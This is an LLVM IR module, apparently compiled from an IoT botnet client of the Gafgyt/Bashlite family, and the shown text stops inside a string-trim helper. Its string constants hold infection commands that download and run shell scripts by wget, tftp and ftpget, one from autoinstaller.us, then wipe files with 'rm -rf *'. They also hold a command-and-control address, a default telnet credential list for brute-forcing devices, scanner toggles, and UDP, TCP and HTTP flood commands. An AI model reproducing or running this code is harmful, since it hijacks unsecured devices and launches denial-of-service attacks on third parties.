; ModuleID = 'host/ir_O1/B1nary.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infectline = local_unnamed_addr global i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), align 8
@.str = private unnamed_addr constant [375 x i8] c"cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\0D\0A\00", align 1
@commServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i32 0, i32 0)], align 8
@.str.1 = private unnamed_addr constant [12 x i8] c"0.0.0.0:666\00", align 1
@useragents = local_unnamed_addr global [23 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.24, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.3 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.4 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.5 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.6 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.7 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.8 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.9 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.10 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.11 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.12 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.13 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.14 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.15 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.16 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.17 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.18 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.19 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.20 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.21 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.22 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.23 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.24 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@gotIP = local_unnamed_addr global i32 0, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@usernames = local_unnamed_addr global [4 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.28, i32 0, i32 0)], align 16
@.str.25 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.26 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.28 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@passwords = local_unnamed_addr global [13 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0)], align 16
@.str.29 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.30 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@.str.31 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"123\00\00", align 1
@.str.33 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.34 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.35 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.36 = private unnamed_addr constant [14 x i8] c"7ujMko0vizxv\00\00", align 1
@.str.37 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@scanPid = common local_unnamed_addr global i32 0, align 4
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.127 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.38 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal unnamed_addr global i32* null, align 8
@.str.39 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.40 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.41 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal unnamed_addr constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.42 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.44 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@.str.46 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.47 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.48 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.49 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.50 = private unnamed_addr constant [8 x i8] c"0.0.0.0\00", align 1
@.str.51 = private unnamed_addr constant [14 x i8] c"GET gtop.sh\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [2 x i8] c"x\00", align 1
@.str.53 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.54 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.55 = private unnamed_addr constant [97 x i8] c"wget -q http://autoinstaller.us/NsfjSh -O .l; chmod +x .l; nohup ./.l </dev/null >/dev/null 2>&1\00", align 1
@.str.56 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.57 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"user:\00", align 1
@.str.59 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.60 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.61 = private unnamed_addr constant [5 x i8] c"word\00", align 1
@.str.62 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [8 x i8] c"invalid\00", align 1
@.str.64 = private unnamed_addr constant [10 x i8] c"incorrect\00", align 1
@.str.65 = private unnamed_addr constant [5 x i8] c"fail\00", align 1
@.str.66 = private unnamed_addr constant [6 x i8] c"again\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"wrong\00", align 1
@.str.68 = private unnamed_addr constant [13 x i8] c"accessdenied\00", align 1
@.str.69 = private unnamed_addr constant [7 x i8] c"denied\00", align 1
@.str.70 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [16 x i8] c"REPORT %s:%s:%s\00", align 1
@.str.75 = private unnamed_addr constant [62 x i8] c"sh x;busybox chmod +x z | | chmod +x z;./z;rm -rf z;rm -f x\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [32 x i8] c"/bin/busybox;echo -e 'gayfgt'\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [10 x i8] c"ulti-call\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"multi-call\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"gayfgt\00", align 1
@.str.80 = private unnamed_addr constant [10 x i8] c"/bin/sh\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.82 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.83 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.84 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.85 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.87 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.88 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.90 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.91 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.92 = private unnamed_addr constant [13 x i8] c"wget -s -U \22\00", align 1
@.str.93 = private unnamed_addr constant [6 x i8] c"\22 -q \00", align 1
@.str.94 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.95 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.96 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.97 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.98 = private unnamed_addr constant [39 x i8] c"SCANNER SSH/TELNET ON | SSH/TELNET OFF\00", align 1
@.str.99 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.100 = private unnamed_addr constant [24 x i8] c"TELNET SCANNER STOPPED\0A\00", align 1
@.str.101 = private unnamed_addr constant [10 x i8] c"TELNET ON\00", align 1
@.str.102 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER EXECUTED\0A\00", align 1
@.str.103 = private unnamed_addr constant [7 x i8] c"SSH ON\00", align 1
@.str.104 = private unnamed_addr constant [22 x i8] c"SSH SCANNER EXECUTED\0A\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.106 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.107 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.109 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.110 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.111 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.112 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.113 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.114 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.115 = private unnamed_addr constant [7 x i8] c"DARKAI\00", align 1
@.str.116 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.117 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.119 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.120 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.121 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.122 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.123 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.124 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.125 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.126 = private unnamed_addr constant [2 x i8] c" \00", align 1
@ipState.0 = internal unnamed_addr global i8 0, align 1
@ipState.1 = internal unnamed_addr global i8 0, align 1
@ipState.2 = internal unnamed_addr global i8 0, align 1
@ipState.3 = internal unnamed_addr global i8 0, align 1
@ipState.4 = internal unnamed_addr global i8 0, align 1

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %2 = add i32 %0, -1640531527
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %3 = add i32 %0, 1013904242
  store i32 %3, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  br label %4

; <label>:4:                                      ; preds = %17, %1
  %indvars.iv = phi i64 [ 3, %1 ], [ %indvars.iv.next.1, %17 ]
  %5 = add nsw i64 %indvars.iv, -3
  %6 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %5
  %7 = load i32, i32* %6, align 4
  %8 = add nsw i64 %indvars.iv, -2
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = trunc i64 %indvars.iv to i32
  %12 = xor i32 %11, -1640531527
  %13 = xor i32 %12, %7
  %14 = xor i32 %13, %10
  %15 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv
  store i32 %14, i32* %15, align 4
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 4096
  br i1 %exitcond, label %16, label %17

; <label>:16:                                     ; preds = %4
  ret void

; <label>:17:                                     ; preds = %4
  %18 = add nsw i64 %indvars.iv, -2
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = add nsw i64 %indvars.iv, -1
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = trunc i64 %indvars.iv.next to i32
  %25 = xor i32 %24, -1640531527
  %26 = xor i32 %25, %20
  %27 = xor i32 %26, %23
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv.next
  store i32 %27, i32* %28, align 4
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  br label %4
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  store i32 %18, i32* %21, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #15
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #15
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %25
  %.0.lcssa.ph = phi i32 [ %24, %.lr.ph22 ], [ %26, %25 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %sext33 = shl i64 %indvars.iv29, 32
  %17 = ashr exact i64 %sext33, 32
  %18 = sext i32 %.0.lcssa to i64
  br label %.critedge

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %25
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %25 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %26, %25 ]
  %19 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %20 = load i8, i8* %19, align 1
  %21 = sext i8 %20 to i32
  %22 = tail call i32 @isspace(i32 %21) #15
  %23 = icmp eq i32 %22, 0
  %24 = trunc i64 %indvars.iv27 to i32
  br i1 %23, label %.critedge.preheader.loopexit, label %25

; <label>:25:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %26 = add nsw i32 %.021, -1
  %27 = icmp sgt i64 %indvars.iv27, %14
  br i1 %27, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader26, %.critedge
  %indvars.iv = phi i64 [ %16, %.critedge.preheader26 ], [ %indvars.iv.next, %.critedge ]
  %28 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %29 = load i8, i8* %28, align 1
  %30 = sub nsw i64 %indvars.iv, %17
  %31 = getelementptr inbounds i8, i8* %0, i64 %30
  store i8 %29, i8* %31, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %32 = icmp slt i64 %indvars.iv, %18
  br i1 %32, label %.critedge, label %.critedge._crit_edge.loopexit

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %33 = sub i64 %.019.lcssa, %indvars.iv29
  %sext34 = shl i64 %33, 32
